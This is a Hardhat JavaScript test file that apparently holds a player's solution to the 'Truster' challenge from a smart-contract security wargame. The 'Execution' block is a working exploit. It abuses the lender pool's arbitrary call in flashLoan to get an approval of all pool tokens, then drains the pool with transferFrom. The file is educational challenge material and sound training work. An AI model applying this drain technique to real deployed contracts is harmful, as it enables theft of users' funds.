const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Truster", function () {
  let deployer, player;
  let token, pool;

  const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    pool = await (
      await ethers.getContractFactory("TrusterLenderPool", deployer)
    ).deploy(token.address);

    expect(await pool.token()).to.eq(token.address);

    await token.transfer(pool.address, TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

    expect(await token.balanceOf(player.address)).to.equal(0);
  });

  //900000n * 10n ** 18n
  it("Execution", async function () {
    const address = player.address;
    const amount = 999999n * 10n ** 18n;

    // Get the ABI interface
    // The arbitrary functionCall allows the attacker to call any function on the token contract
    // So the approve is called, allowing the attacker to transfer all tokens from the pool to the player
    const abi = ["function approve(address,uint256)"];
    const iface = new ethers.utils.Interface(abi);
    const data = iface.encodeFunctionData("approve", [address, TOKENS_IN_POOL]);
    await pool.flashLoan(0, player.address, token.address, data);
    const playerAtt = await token.connect(player);
    await playerAtt.transferFrom(pool.address, player.address, TOKENS_IN_POOL);
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(0);
  });
});
